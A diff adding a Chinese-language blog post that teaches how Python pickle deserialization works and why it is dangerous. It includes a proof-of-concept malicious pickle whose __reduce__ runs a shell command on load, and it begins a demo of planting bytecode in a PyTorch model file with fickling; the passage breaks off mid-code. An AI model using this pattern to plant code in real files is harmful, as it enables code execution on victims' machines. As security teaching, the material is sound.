@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>
+    Sleepy Pickle
+  </title>
+  <meta name="description" content="以 Python Pickle 為例，探討序列化/反序列化與安全風險">
+  <meta name="keywords" content="Pickle, Python, Serialization, Deserialization, Security">
+  <meta name="author" content="yunshiuan">
+  <link rel="canonical" href="https://yunshiuan.com/2025/08/14/SleepyPickle/">
+  
+  
+  <link rel="icon" href='/assets/favicon.png'>
+  
+  
+  
+<link rel="stylesheet" href="/css/b4c95347.css">
+
+  <script>window.i18n = {"tip-status-done":"Done","tip-status-default":"All","tip-status-todo":"Todo","tip-status-doing":"Doing","tip-status-other":"Other","text-select":"Select","text-move":"Move","text-esc":"Exit","January":"January","February":"February","March":"March","April":"April","May":"May","June":"June","July":"July","August":"August","September":"September","October":"October","November":"November","December":"December"}</script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body id="app">
+  <aside id="aside-box" class="left-aside">
+    <div class="header">
+      
+<link rel="stylesheet" href="/css/61875ce9.css">
+
+<div class="profile">
+  <a class="badge" href="/">
+    <span>Hi</span>
+    <span>yunshiuan</span>
+  </a>
+  <cosy-tooltip id="left-aside-button" placement="right">
+    <span slot="content">
+      <span>Show / Hide Left Navigation</span>
+      <cosy-short-key>[</cosy-short-key>
+    </span>
+    <cosy-icon>
+      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+        <g fill="none">
+          <path d="M16 4c1.104-.019 2 .896 2 2v8a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h12zm1 2a1 1 0 0 0-1-1h-2.995v10H16a1 1 0 0 0 1-1V6zm-4.995 9V5H4.001a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8.004z" fill="currentColor"></path>
+        </g>
+      </svg>
+    </cosy-icon>
+  </cosy-tooltip>
+</div>
+
+<script src="/js/69622cae.js"></script>
+
+      
+
+
+<cosy-search id="post-search" placeholder="Search">
+  <div slot="short-key">
+    <cosy-short-key>⌘</cosy-short-key>
+    <cosy-short-key>K</cosy-short-key>
+  </div>
+</cosy-search>
+
+
+<script>
+  window.algolia = {
+    appId: "WGUHT44H35",
+    SearchOnlyAPIKey: "c9b92587c55d61224e59aee4a714fb0c"
+  }
+</script>
+
+
+<script src="/js/0a6f193b.js"></script>
+
+    </div>
+    <div class="aside-category">
+      
+<link rel="stylesheet" href="/css/db04a759.css">
+
+
+<nav class="category-nav cosy-scrollbar">
+  <ul><li data-path="archives">
+        <a href="/archives">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M3.5 3A1.5 1.5 0 0 0 2 4.5v4A1.5 1.5 0 0 0 3.5 10h9A1.5 1.5 0 0 0 14 8.5v-4A1.5 1.5 0 0 0 12.5 3h-9zM3 4.5a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v4a.5.5 0 0 1-.5.5h-9a.5.5 0 0 1-.5-.5v-4zm.5 6.5A1.5 1.5 0 0 0 2 12.5v4A1.5 1.5 0 0 0 3.5 18h9a1.5 1.5 0 0 0 1.5-1.5v-4a1.5 1.5 0 0 0-1.5-1.5h-9zM3 12.5a.5.5 0 0 1 .5-.5h9a.5.5 0 0 1 .5.5v4a.5.5 0 0 1-.5.5h-9a.5.5 0 0 1-.5-.5v-4zm14-.063a2.003 2.003 0 0 1-2.5-1.937A2 2 0 0 1 16 8.563a2.005 2.005 0 0 1 1 0a2 2 0 0 1 0 3.874zM16.5 3a.5.5 0 0 1 .5.5v4.041a3.02 3.02 0 0 0-1 0V3.5a.5.5 0 0 1 .5-.5zm0 10.5c-.17 0-.337-.014-.5-.041V17.5a.5.5 0 0 0 1 0v-4.041c-.163.027-.33.041-.5.041z" fill="currentColor"></path></g></svg>
+          <div class="ellipsis">Archives</div>
+        </a>
+      </li><li data-path="cosy-roadmap">
+        <a href="/cosy-roadmap">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M9.384 2a1 1 0 0 0-.966.742L4.616 17H2.5a.5.5 0 0 0 0 1h15a.5.5 0 0 0 0-1h-2.116L11.582 2.742A1 1 0 0 0 10.616 2H9.384zM5.651 17l.8-3H11.5a.5.5 0 0 0 0-1H6.717l.534-2H10.5a.5.5 0 0 0 0-1H7.517l1.867-7h1.232l3.733 14H5.651z" fill="currentColor"></path></g></svg>
+          <div class="ellipsis">Roadmap</div>
+        </a>
+      </li><li data-path="cosy-resume">
+        <a href="/cosy-resume">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20"><g fill="none"><path d="M8.5 4.498a1.5 1.5 0 1 1 3 0a1.5 1.5 0 0 1-3 0zm1.5-2.5a2.5 2.5 0 0 0-2.43 3.086L5.471 4.15a1.761 1.761 0 0 0-2.317.88c-.4.882-.008 1.917.877 2.31L7 8.662v2.287l-1.877 4.645a1.75 1.75 0 0 0 3.245 1.311l1.556-3.849a.073.073 0 0 1 .028-.038a.086.086 0 0 1 .046-.012c.02 0 .035.005.046.012a.074.074 0 0 1 .028.038l1.555 3.849a1.75 1.75 0 0 0 3.245-1.311L13 10.96V8.662l2.968-1.322a1.74 1.74 0 0 0 .877-2.31a1.761 1.761 0 0 0-2.317-.88l-2.097.934a2.5 2.5 0 0 0-2.43-3.086zM4.065 5.444a.761.761 0 0 1 1-.38l3.918 1.744a2.5 2.5 0 0 0 2.034 0l3.918-1.744a.761.761 0 0 1 1 .38a.739.739 0 0 1-.373.983l-2.969 1.321a1 1 0 0 0-.593.914v2.298a1 1 0 0 0 .073.375l1.872 4.633a.75.75 0 0 1-1.39.562l-1.556-3.849c-.364-.9-1.639-.9-2.003 0l-1.555 3.85a.75.75 0 1 1-1.39-.562l1.876-4.646A1 1 0 0 0 8 10.95V8.662a1 1 0 0 0-.593-.914L4.438 6.427a.739.739 0 0 1-.373-.983z" fill="currentColor"></path></g></svg>
+          <div class="ellipsis">Resume</div>
+        </a>
+      </li></ul>
+  <ul><li class="">
+        <a href="/categories/2025-%E9%90%B5%E4%BA%BA%E8%B3%BD/">
+          
+          <div class="ellipsis">
+            <span>2025 鐵人賽</span>
+          </div>
+        </a>
+      </li><li class="active">
+        <a href="/categories/Blog/">
+          
+          <div class="ellipsis">
+            <span>Blog</span>
+          </div>
+        </a>
+      </li><li class="">
+        <a href="/categories/Certificate/">
+          
+          <div class="ellipsis">
+            <span>Certificate</span>
+          </div>
+        </a>
+      </li><li class="">
+        <a href="/categories/Writeup/">
+          
+          <div class="ellipsis">
+            <span>Writeup</span>
+          </div>
+        </a>
+      </li></ul>
+</nav>
+
+
+<script src="/js/066f8989.js"></script>
+
+    </div>
+    <div class="bottom">
+      <cosy-tooltip id="button-preference" placement="right">
+        <span slot="content">
+          <span>Preference</span>
+          <cosy-short-key>⌘</cosy-short-key>
+          <cosy-short-key>p</cosy-short-key>
+        </span>
+        <cosy-icon bordered id="button-about-cosy-theme">
+          <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 16 16">
+            <g fill="none">
+              <path d="M8 6a2 2 0 1 0 0 4a2 2 0 0 0 0-4zM7 8a1 1 0 1 1 2 0a1 1 0 0 1-2 0zm3.618-3.602a.708.708 0 0 1-.824-.567l-.26-1.416a.354.354 0 0 0-.275-.282a6.072 6.072 0 0 0-2.519 0a.354.354 0 0 0-.275.282l-.259 1.416a.71.71 0 0 1-.936.538l-1.359-.484a.355.355 0 0 0-.382.095c-.569.627-1 1.367-1.262 2.173a.352.352 0 0 0 .108.378l1.102.931a.704.704 0 0 1 0 1.076l-1.102.931a.352.352 0 0 0-.108.378A5.986 5.986 0 0 0 3.53 12.02a.355.355 0 0 0 .382.095l1.36-.484a.708.708 0 0 1 .936.538l.258 1.416c.026.14.135.252.275.281a6.075 6.075 0 0 0 2.52 0a.353.353 0 0 0 .274-.281l.26-1.416a.71.71 0 0 1 .936-.538l1.359.484c.135.048.286.01.382-.095c.569-.627 1-1.367 1.262-2.173a.352.352 0 0 0-.108-.378l-1.102-.931a.703.703 0 0 1 0-1.076l1.102-.931a.352.352 0 0 0 .108-.378A5.985 5.985 0 0 0 12.47 3.98a.355.355 0 0 0-.382-.095l-1.36.484a.71.71 0 0 1-.111.03zm-6.62.58l.937.333a1.71 1.71 0 0 0 2.255-1.3l.177-.97a5.105 5.105 0 0 1 1.265 0l.178.97a1.708 1.708 0 0 0 2.255 1.3L12 4.977c.255.334.467.698.63 1.084l-.754.637a1.704 1.704 0 0 0 0 2.604l.755.637a4.99 4.99 0 0 1-.63 1.084l-.937-.334a1.71 1.71 0 0 0-2.255 1.3l-.178.97a5.099 5.099 0 0 1-1.265 0l-.177-.97a1.708 1.708 0 0 0-2.255-1.3L4 11.023a4.987 4.987 0 0 1-.63-1.084l.754-.638a1.704 1.704 0 0 0 0-2.603l-.755-.637c.164-.386.376-.75.63-1.084z" fill="currentColor"></path>
+            </g>
+          </svg>
+        </cosy-icon>
+      </cosy-tooltip>
+    </div>
+  </aside>
+  <main>
+    
+<link rel="stylesheet" href="/css/4dbc8f91.css">
+
+
+<div class="post-container">
+  <header>
+    <div class="left">
+      
+<link rel="stylesheet" href="/css/7d333f9e.css">
+
+<nav class="breadcrumb">
+  <section>
+    <cosy-tooltip placement="bottom-left">
+      <span slot="content"><span>Home</span>
+        <cosy-short-key>⌘</cosy-short-key>
+        <cosy-short-key>H</cosy-short-key>
+      </span>
+      <cosy-icon href="/">
+        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+          <g fill="none">
+            <path d="M8.998 2.388a1.5 1.5 0 0 1 2.005 0l5.5 4.942A1.5 1.5 0 0 1 17 8.445V15.5a1.5 1.5 0 0 1-1.5 1.5H13a1.5 1.5 0 0 1-1.5-1.5V12a.5.5 0 0 0-.5-.5H9a.5.5 0 0 0-.5.5v3.5A1.5 1.5 0 0 1 7 17H4.5A1.5 1.5 0 0 1 3 15.5V8.445c0-.425.18-.83.498-1.115l5.5-4.942zm1.336.744a.5.5 0 0 0-.668 0l-5.5 4.942A.5.5 0 0 0 4 8.445V15.5a.5.5 0 0 0 .5.5H7a.5.5 0 0 0 .5-.5V12A1.5 1.5 0 0 1 9 10.5h2a1.5 1.5 0 0 1 1.5 1.5v3.5a.5.5 0 0 0 .5.5h2.5a.5.5 0 0 0 .5-.5V8.445a.5.5 0 0 0-.166-.371l-5.5-4.942z" fill="currentColor"></path>
+          </g>
+        </svg>
+      </cosy-icon>
+    </cosy-tooltip>
+    
+    
+    <svg class="arrow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+      <g fill="none">
+        <path d="M7.733 4.207a.75.75 0 0 1 1.06.026l5.001 5.25a.75.75 0 0 1 0 1.035l-5 5.25a.75.75 0 1 1-1.087-1.034L12.216 10l-4.51-4.734a.75.75 0 0 1 .027-1.06z" fill="currentColor"></path>
+      </g>
+    </svg>
+    <a class="ellipsis" href="/categories/Blog/">
+      Blog
+    </a>
+    
+    
+    
+    <svg class="arrow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+      <g fill="none">
+        <path d="M7.733 4.207a.75.75 0 0 1 1.06.026l5.001 5.25a.75.75 0 0 1 0 1.035l-5 5.25a.75.75 0 1 1-1.087-1.034L12.216 10l-4.51-4.734a.75.75 0 0 1 .027-1.06z" fill="currentColor"></path>
+      </g>
+    </svg>
+    <span class="ellipsis">
+      Sleepy Pickle
+    </span>
+    
+  </section>
+</nav>
+
+
+<script src="/js/31d6cfe0.js"></script>
+
+    </div>
+    <div class="right">
+      
+        <cosy-tooltip id="toc-show-button" placement="left">
+          <span slot="content">
+            <span>Show / Hide Table of Contents</span>
+            <cosy-short-key>]</cosy-short-key>
+          </span>
+          <cosy-icon>
+            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 20 20">
+              <g fill="none">
+                <path
+                  d="M4 4c-1.104-.019-2 .896-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2H4zM3 6a1 1 0 0 1 1-1h2.995v10H4a1 1 0 0 1-1-1V6zm4.995 9V5h8.004a1 1 0 0 1 1 1v8a1 1 0 0 1-1 1H7.995z"
+                  fill="currentColor"></path>
+              </g>
+            </svg>
+          </cosy-icon>
+        </cosy-tooltip>
+        
+    </div>
+  </header>
+  <div class="content">
+    <main class="cosy-scrollbar">
+      <div class="article-container">
+        <!-- 渲染文章内容 -->
+        <article>
+          <!-- 文章标题 -->
+          <h1 class="post-title">Sleepy Pickle</h1>
+          <div class="last-updated">
+            Last updated: 2025-08-15 13:17:36
+          </div>
+          <!-- 文章 -->
+          <h1 id="💤🥒Sleeply-Pickle"><a href="#💤🥒Sleeply-Pickle" class="headerlink" title="💤🥒Sleeply Pickle"></a>💤🥒Sleeply Pickle</h1><p>Demo code : <a target="_blank" rel="noopener" href="https://github.com/YunshiuanOAO/SleepyPickle-Demo">https://github.com/YunshiuanOAO/SleepyPickle-Demo</a></p>
+<p>Slido : <a target="_blank" rel="noopener" href="https://speakerdeck.com/yunshiuanoao/sleeplypickle">https://speakerdeck.com/yunshiuanoao/sleeplypickle</a></p>
+<h2 id="♻️序列化-Serialization-反序列化-Deserialization"><a href="#♻️序列化-Serialization-反序列化-Deserialization" class="headerlink" title="♻️序列化(Serialization)&#x2F;反序列化(Deserialization)"></a>♻️序列化(Serialization)&#x2F;反序列化(Deserialization)</h2><p>序列化是將一個資料結構或物件轉換成一種可以儲存或交換的格式（如位元組流、JSON、XML 等）。這樣的轉換讓物件能夠寫入檔案、透過網路傳輸，或儲存在資料庫中。</p>
+<p>反序列化則是將儲存的數據或接收到的數據轉換回原始的物件或資料結構。</p>
+<p><img src="/./assets/picklePic.png" alt="alt text"></p>
+<hr>
+<h2 id="🥒-What-is-Pickle"><a href="#🥒-What-is-Pickle" class="headerlink" title="🥒 What is Pickle?"></a>🥒 What is Pickle?</h2><p>Pickle 是 Python 的內建模組，提供了將 Python 物件序列化和反序列化的功能。</p>
+<p>常見用途</p>
+<dl><dt>:    將物件儲存到檔案中，方便之後載入。<br>:    將物件透過網路或其他通道進行傳輸。</dt><dd><strong>快速儲存和載入機器學習模型、配置檔或計算結果</strong>。</dd></dl><p>支援的物件類型</p>
+<dl><dt>:    Pickle 支援多種 Python 內建的資料型態，包括：<br>:    ✔️ 數字（int, float）<br>:    ✔️ 字串（str）<br>:    ✔️ 列表（list）、元組（tuple）、字典（dict）、集合（set）<br>:    ✔️ 自訂類別物件</dt><dd>✔️ 函數</dd></dl><p>Example : </p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> pickletools
+
+
+data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Alice"</span><span class="token punctuation">,</span> <span class="token string">"age"</span><span class="token punctuation">:</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token string">"scores"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"data.pkl"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
+    pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">,</span> protocol<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Data has been successfully serialized to data.pkl"</span><span class="token punctuation">)</span>
+
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"data.pkl"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
+    unpickled_data <span class="token operator">=</span> pickle<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>unpickled_data<span class="token punctuation">)</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Output: </p>
+<pre class="line-numbers language-none"><code class="language-none">Data has been successfully serialized to data.pkl
+&#123;&#39;name&#39;: &#39;Alice&#39;, &#39;age&#39;: 30, &#39;scores&#39;: [88, 92, 95]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>可以使用pickletools將pickle執行的內容dump出來</p>
+<pre class="line-numbers language-none"><code class="language-none">    0: (    MARK
+    1: d        DICT       (MARK at 0)
+    2: p    PUT        0
+    5: V    UNICODE    &#39;name&#39;
+   11: p    PUT        1
+   14: V    UNICODE    &#39;Alice&#39;
+   21: p    PUT        2
+   24: s    SETITEM
+   25: V    UNICODE    &#39;age&#39;
+   30: p    PUT        3
+   33: I    INT        30
+   37: s    SETITEM
+   38: V    UNICODE    &#39;scores&#39;
+   46: p    PUT        4
+   49: (    MARK
+   50: l        LIST       (MARK at 49)
+   51: p    PUT        5
+   54: I    INT        88
+   58: a    APPEND
+   59: I    INT        92
+   63: a    APPEND
+   64: I    INT        95
+   68: a    APPEND
+   69: s    SETITEM
+   70: .    STOP
+highest protocol among opcodes &#x3D; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>由上面的資訊可以得知，其實Pickle在反序列化的過成就很像一個簡易的堆疊虛擬機在執行，透過Opcode並且在Pickle Virtual Machine執行<br>主要由這三個</p>
+<ul>
+<li><p>指令處理器 (Instruction Processor)</p>
+<p>  從指令流 (byte stream) 中讀取 opcode 與參數，並依序進行解譯與處理。</p>
+<p>  不斷重複「讀取 -&gt; 處理」的流程，直到遇到結束符號（通常是 .）後停止。</p>
+<p>  反序列化結束時，最終留在 stack 頂端的值將作為反序列化結果返回。</p>
+</li>
+<li><p>Stack (堆疊)</p>
+<p>  由 Python 的 list 實作。</p>
+<p>  用於暫時儲存資料、參數以及各種物件。</p>
+<p>  各種 opcode 會操作此堆疊（如推入、彈出、組合容器等）。</p>
+</li>
+<li><p>Memo (備忘錄)</p>
+<p>  由 Python 的 dict 實作。</p>
+<p>  在 PVM 整個生命週期中，負責儲存先前出現過的物件，以便重複引用或避免重複建立。</p>
+<p>  透過索引或序號 (index) 來存取對應物件。</p>
+</li>
+</ul>
+<p>以下為常用的opcode </p>
+<table>
+<thead>
+<tr>
+<th align="center"><strong>指令</strong></th>
+<th align="left"><strong>描述</strong></th>
+<th align="left"><strong>具體寫法</strong></th>
+<th align="left"><strong>對 stack 的變化</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><strong>c</strong></td>
+<td align="left">取得一個全局物件或 import 一個模組</td>
+<td align="left"><code>c[module]\n[instance]\n</code></td>
+<td align="left">取得的物件入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>o</strong></td>
+<td align="left">尋找 stack 中的上一個 MARK，以之間的第一個資料（必須為函數）為 callable，第二個到第 n 個資料為參數，執行該函數（或實例化一個物件）</td>
+<td align="left"><code>o</code></td>
+<td align="left">這個過程中涉及到的資料都出 stack，函數的返回值（或生成的物件）入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>i</strong></td>
+<td align="left">相當於 c 和 o 的組合，先取得一個全局函數，然後尋找 stack 中的上一個 MARK，並組合之間的資料為元組，再以該元組為參數執行全局函數（或實例化一個物件）</td>
+<td align="left"><code>i[module]\n[callable]\n</code></td>
+<td align="left">這個過程中涉及到的資料都出 stack，函數返回值（或生成的物件）入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>N</strong></td>
+<td align="left">實例化一個 None</td>
+<td align="left"><code>N</code></td>
+<td align="left">取得的 None 對象入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>S</strong></td>
+<td align="left">實例化一個字串對象</td>
+<td align="left"><code>S&#39;xxx&#39;\n</code><br>也可使用雙引號或 <code>\&#39;</code> 等 Python 字串形式</td>
+<td align="left">取得的字串對象入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>V</strong></td>
+<td align="left">實例化一個 Unicode 字串對象</td>
+<td align="left"><code>Vxxx\n</code></td>
+<td align="left">取得的字串對象入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>I</strong></td>
+<td align="left">實例化一個 int 對象</td>
+<td align="left"><code>Ixxx\n</code></td>
+<td align="left">取得的整數對象入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>F</strong></td>
+<td align="left">實例化一個 float 對象</td>
+<td align="left"><code>Fx.x\n</code></td>
+<td align="left">取得的浮點數對象入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>R</strong></td>
+<td align="left">選擇 stack 上的第一個對象作為函數、第二個對象作為參數（第二個對象必須為元組），然後呼叫該函數</td>
+<td align="left"><code>R</code></td>
+<td align="left">函數和參數出 stack，函數的返回值入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>.</strong></td>
+<td align="left">程式結束，stack 頂的單一元素作為 <code>pickle.loads()</code> 的返回值</td>
+<td align="left"><code>.</code></td>
+<td align="left">無</td>
+</tr>
+<tr>
+<td align="center"><strong>(</strong></td>
+<td align="left">向 stack 中壓入一個 MARK 標記</td>
+<td align="left"><code>(</code></td>
+<td align="left">MARK 標記入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>t</strong></td>
+<td align="left">尋找 stack 中的上一個 MARK，並組合之間的資料為元組</td>
+<td align="left"><code>t</code></td>
+<td align="left">MARK 標記以及被組合的資料出 stack，生成的元組入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>)</strong></td>
+<td align="left">向 stack 中直接壓入一個空元組</td>
+<td align="left"><code>)</code></td>
+<td align="left">空元組入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>l</strong></td>
+<td align="left">尋找 stack 中的上一個 MARK，並組合之間的資料為列表</td>
+<td align="left"><code>l</code></td>
+<td align="left">MARK 標記以及被組合的資料出 stack，生成的列表入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>]</strong></td>
+<td align="left">向 stack 中直接壓入一個空列表</td>
+<td align="left"><code>]</code></td>
+<td align="left">空列表入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>d</strong></td>
+<td align="left">尋找 stack 中的上一個 MARK，並組合之間的資料為字典（資料必須有偶數個，即呈 key-value 對）</td>
+<td align="left"><code>d</code></td>
+<td align="left">MARK 標記以及被組合的資料出 stack，生成的字典入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>}</strong></td>
+<td align="left">向 stack 中直接壓入一個空字典</td>
+<td align="left"><code>&#125;</code></td>
+<td align="left">空字典入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>p</strong></td>
+<td align="left">將 stack 頂對象儲存至 memo_n</td>
+<td align="left"><code>pn\n</code></td>
+<td align="left">無</td>
+</tr>
+<tr>
+<td align="center"><strong>g</strong></td>
+<td align="left">將 memo_n 的對象壓入 stack</td>
+<td align="left"><code>gn\n</code></td>
+<td align="left">將指定索引的 memo 對象入 stack</td>
+</tr>
+<tr>
+<td align="center"><strong>0</strong></td>
+<td align="left">丟棄 stack 頂對象</td>
+<td align="left"><code>0</code></td>
+<td align="left">stack 頂對象被丟棄</td>
+</tr>
+<tr>
+<td align="center"><strong>b</strong></td>
+<td align="left">使用 stack 中的第一個元素（儲存多個屬性名: 屬性值的字典）對第二個元素（對象實例）進行屬性設置</td>
+<td align="left"><code>b</code></td>
+<td align="left">stack 上第一個元素出 stack；第二個元素（對象）被更新</td>
+</tr>
+<tr>
+<td align="center"><strong>s</strong></td>
+<td align="left">將 stack 的第一個和第二個對象作為 key-value 對，添加或更新到 stack 的第三個對象（必須為列表或字典，列表以數字作為 key）</td>
+<td align="left"><code>s</code></td>
+<td align="left">第一、二個元素出 stack，第三個元素（列表或字典）被更新</td>
+</tr>
+<tr>
+<td align="center"><strong>u</strong></td>
+<td align="left">尋找 stack 中的上一個 MARK，組合之間的資料（必須有偶數個，即 key-value 對）並全部添加或更新到該 MARK 之前的一個對象（必須為字典）</td>
+<td align="left"><code>u</code></td>
+<td align="left">MARK 標記以及被組合的資料出 stack，字典被更新</td>
+</tr>
+<tr>
+<td align="center"><strong>a</strong></td>
+<td align="left">將 stack 的第一個元素 append 到第二個元素（列表）中</td>
+<td align="left"><code>a</code></td>
+<td align="left">stack 頂元素出 stack，第二個元素（列表）被更新</td>
+</tr>
+<tr>
+<td align="center"><strong>e</strong></td>
+<td align="left">尋找 stack 中的上一個 MARK，組合之間的資料並 extends 到該 MARK 之前的一個元素（必須為列表）</td>
+<td align="left"><code>e</code></td>
+<td align="left">MARK 標記以及被組合的資料出 stack，列表被更新</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="⚠️What’s-Wrong-with-Pickle"><a href="#⚠️What’s-Wrong-with-Pickle" class="headerlink" title="⚠️What’s Wrong with Pickle ?"></a>⚠️What’s Wrong with Pickle ?</h2><p>Pickle文檔上有出現這一個警告<br><img src="/./assets/image.png" alt="alt text"></p>
+<p>Pickle當中有一個 <code>__reduce__</code> 可以使用，當反序列化時會自動呼叫</p>
+<p>以下範例為製作一個惡意的pickle</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">
+<span class="token keyword">import</span> pickle
+<span class="token keyword">import</span> subprocess
+
+<span class="token keyword">class</span> <span class="token class-name">EvilPickle</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token punctuation">(</span>subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+e <span class="token operator">=</span>  EvilPickle<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'evil.pkl'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    pickle<span class="token punctuation">.</span>dump<span class="token punctuation">(</span>e<span class="token punctuation">,</span> f<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>用pickletool 把惡意pickle檔dump出來看看</p>
+<pre class="line-numbers language-none"><code class="language-none">    0: c    GLOBAL     &#39;commands Popen&#39;
+   16: p    PUT        0
+   19: (    MARK
+   20: (        MARK
+   21: V            UNICODE    &#39;ls&#39;
+   25: p            PUT        1
+   28: t            TUPLE      (MARK at 20)
+   29: p        PUT        2
+   32: t        TUPLE      (MARK at 19)
+   33: p    PUT        3
+   36: R    REDUCE
+   37: p    PUT        4
+   40: .    STOP
+highest protocol among opcodes &#x3D; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>執行結果：<br><img src="/./assets/reduce_RCE.png" alt="alt text"></p>
+<p>即可執行<code>ls</code>指令</p>
+<hr>
+<h2 id="💤Sleepy-Pickle"><a href="#💤Sleepy-Pickle" class="headerlink" title="💤Sleepy Pickle"></a>💤Sleepy Pickle</h2><p>利用pickle不安全的特性，將惡意的Bytecode植入使用pickle的模型檔案內。</p>
+<p><img src="/./assets/image-2.png" alt="alt text"><br>有一個針對此攻擊而產生的工具：<a target="_blank" rel="noopener" href="https://github.com/trailofbits/fickling">fickling</a></p>
+<p>此工具可以輕易的將想要執行的程式轉成bytecode值入進pickle中，另外也有檢測pickele內的惡意行為功能</p>
+<p>demo:</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torch
+<span class="token keyword">import</span> torchvision<span class="token punctuation">.</span>models <span class="token keyword">as</span> models
+<span class="token keyword">import</span> warnings
+<span class="token keyword">from</span> fickling<span class="token punctuation">.</span>pytorch <span class="token keyword">import</span> PyTorchModelWrapper
+warnings<span class="token punctuation">.</span>filterwarnings<span class="token punctuation">(</span><span class="token string">"ignore"</span><span class="token punctuation">)</span>
+
+model <span class="token operator">=</span> models<span class="token punctuation">.</span>mobilenet_v2<span class="token punctuation">(</span><span class="token punctuation">)</span>
